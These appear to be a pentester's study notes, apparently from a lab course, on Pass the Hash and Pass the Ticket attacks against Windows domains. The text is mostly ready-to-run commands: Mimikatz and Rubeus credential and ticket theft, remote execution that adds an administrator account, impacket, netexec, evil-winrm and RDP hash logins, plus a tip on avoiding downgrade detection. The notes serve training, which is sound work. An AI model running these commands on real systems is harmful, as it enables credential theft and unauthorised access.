# Pass the Hash (PtH)

**What is NTLM?**
**Windows New Technology Lan Manager (NTLM)** is a set of security protocols that authenticates users' identities while keeping the integrity and confidentiality of their data.

## Pass the Hash with Mimikatz (Windows)

We can use the `sekurlsa::pth` module. We need to specify the following for the command:

- `/user` - The user name we want to impersonate.
- `/rc4` or `/NTLM` - NTLM hash of the user's password.
- `/domain` - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).
- `/run` - The program we want to run with the user's context (if not specified, it will launch cmd.exe).

```powershell
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```

## Pass the Hash with PowerShell Invoke-TheHash (Windows)

When using `Invoke-TheHash`, we have two options: SMB or WMI command execution.

We have to specify the following parameters:

- `Target` - Hostname or IP address of the target.
- `Username` - Username to use for authentication.
- `Domain` - Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username.
- `Hash` - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.
- `Command` - Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.

```powershell
Import-Module .\Invoke-TheHash.psd1

Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA...SNIP..."
```

## Pass the Hash with Impacket (Linux)

```sh
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

There are several other tools in the Impacket toolkit we can use for command execution using Pass the Hash attacks, such as:

- [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
- [impacket-atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
- [impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)

## Pass the Hash with NetExec (Linux)

#### Pass the Hash with NetExec

```sh
netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```

If we want to authenticate as  the local admin, we can use the `--local-auth`
#### NetExec - Command Execution

```sh
netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```

## Pass the Hash with evil-winrm (Linux)

#### Pass the Hash with evil-winrm

```sh
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

```ad-note
When using a domain account, we need to include the domain name, for example: administrator@inlanefreight.htb
```

## Pass the Hash with RDP (Linux)

There are a few caveats to this attack:

- `Restricted Admin Mode`, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with the following error:

![[xfreerdp-error.png]]

This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with the value of 0. It can be done using the following command:

```powershell
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

![[DisableRestrictedAdmin-Registry.png]]

#### Pass the Hash using RDP

```sh
xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```

## UAC limits Pass the Hash for local accounts

```ad-info
UAC (User Account Control) limits local users' ability to perform remote administration operations. When the registry key `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` is set to 0, it means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed to perform remote administration tasks. Setting it to 1 allows the other local admins as well.
```

```ad-note
There is one exception, if the registry key `FilterAdministratorToken` (disabled by default) is enabled (value 1), the RID 500 account (even if it is renamed) is enrolled in UAC protection. This means that remote PTH will fail against the machine when using that account.
```

```ad-resources
Learn more about LocalAccountTokenFilterPolicy
[Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy](https://posts.specterops.io/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy-506c25a7c167).
```

# Pass the Ticket (PtT) from Windows

## Kerberos protocol refresher

- The `Ticket Granting Ticket` (`TGT`) is the first ticket obtained on a Kerberos system. The TGT permits the client to obtain additional Kerberos tickets or `TGS`.
- The `Ticket Granting Service` (`TGS`) is requested by users who want to use a service. These tickets allow services to verify the user's identity.

## Pass the Ticket (PtT) attack

We need a valid Kerberos ticket to perform a `Pass the Ticket (PtT)` attack. It can be:

- Service Ticket (TGS) to allow access to a particular resource.
- Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.

## Harvesting Kerberos tickets from Windows

Tickets are processed and stored by LSASS. Therefore, if we want to get tickets we have to communicate with LSASS. With non-administrative privileges, we can only get our tickets, but as local administrator, we can collect everything.

We can use the module `sekurlsa::tickets /export`. We will get a list of `.kirbi` files which contains the tickets.

```ad-note
If you pick a ticket with the service krbtgt, it corresponds to the TGT of that account.
```

We can also use `Rubeus` instead of `Mimikatz`

#### Rubeus - Export tickets

```powershell
Rubeus.exe dump /nowrap
```

```ad-important
To collect all tickets we need to execute Mimikatz or Rubeus as an administrator.
```

## Pass the Key aka. OverPass the Hash

The traditional **Pass the Hash (PtH)** involves reusing NTLM password hash that doesn't touch Kerberos. The **Pass the Key (Over Pass the Hash)** approach converts a hash/key for a domain joined user into a full **TGT**.

To forge our tickets, we need to have the user's hash; we can use Mimikatz to dump all users Kerberos encryption keys using the module `sekurlsa::ekeys`. This module will enumerate all key types present for the Kerberos package.

#### Mimikatz - Pass the Key aka. OverPass the Hash

```powershell
.\mimikatz.exe "privilege::debug" "sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:HASH_HERE"
```

#### Rubeus - Pass the Key aka. OverPass the Hash

```powershell
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:HASH_HERE /nowrap
```

```ad-note
Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.
```

```ad-info
To learn more about the difference between Mimikatz `sekurlsa::pth` and Rubeus `asktgt`, consult the Rubeus tool documentation [Example for OverPass the Hash](https://github.com/GhostPack/Rubeus#example-over-pass-the-hash).
```

```ad-caution
Modern Windows domains (functional level 2008 and above) use AES encryption by default in normal Kerberos exchanges. If we use an rc4_hmac (NTLM) hash in a Kerberos exchange instead of an aes256_cts_hmac_sha1 (or aes128) key, it may be detected as an "encryption downgrade."
```

## Pass the Ticket (PtT)

In `Rubeus` we can use the `/ptt` option to submit the ticket to the current logon session.

```powershell
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```

Another way is to import the ticket into the current session using the `.kirbi` file from the disk.

#### Rubeus - Pass the Ticket

Let's use a ticket exported from `Mimikatz` and import it using Pass the Ticket

```powershell
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```

Or we can convert the `.kirbi` file to Base64 to perform the Pass the Ticket attack.

```PowerShell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```

#### Pass the Ticket - Base64 Format

```powershell
Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA...SNIP...
```

#### Mimikatz - Pass the Ticket

We can use the `kerberos:ptt` module.

```powershell
.\mimikatz.exe "privilege::debug" "kerberos::ptt C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
```

```ad-note
Instead of opening mimikatz.exe with cmd.exe and exiting to get the ticket into the current command prompt, we can use the Mimikatz module `misc` to launch a new command prompt window with the imported ticket using the `misc::cmd` command.
```

## Pass The Ticket with PowerShell Remoting (Windows)

### Mimikatz - PowerShell Remoting with Pass the Ticket

![[Mimikatz - PSRemote PTT.png]]

### Rubeus - PowerShell Remoting with Pass the Ticket

Rubeus has the option `createnetonly`, which creates a sacrificial process/logon session ([Logon type 9](https://eventlogxp.com/blog/logon-type-what-does-it-mean/)). The process is hidden by default, but we can specify the flag `/show` to display the process, and the result is the equivalent of `runas /netonly`. This prevents the erasure of existing TGTs for the current logon session.

#### Create a sacrificial process with Rubeus

```powershell
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

From the new CMD that will open, we can do the `/ptt` to import the ticket into our current session.

```powershell
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
```

